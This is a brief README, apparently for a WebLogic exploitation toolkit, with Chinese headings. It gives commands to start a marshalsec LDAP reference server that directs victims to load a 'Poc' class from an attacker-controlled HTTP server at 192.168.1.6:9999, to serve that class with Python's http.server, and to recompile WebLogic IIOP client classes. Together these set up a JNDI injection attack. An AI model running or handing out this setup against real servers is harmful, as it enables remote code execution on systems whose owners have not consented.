# weblogic-tools
weblogic-tools

启动 JNDI 服务

```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.1.6:9999/#Poc 1099
```

启动 HTTP 服务

```
python -m http.server 9999
```

修改代码

```
javac -cp wlfullclient.jar -source 1.5 -target 1.5 -sourcepath weblogic -d weblogic weblogic/iiop/IORManager.java

javac -cp wlfullclient.jar -source 1.5 -target 1.5 -sourcepath weblogic -d weblogic weblogic/corba/idl/RemoteDelegateImpl.java
```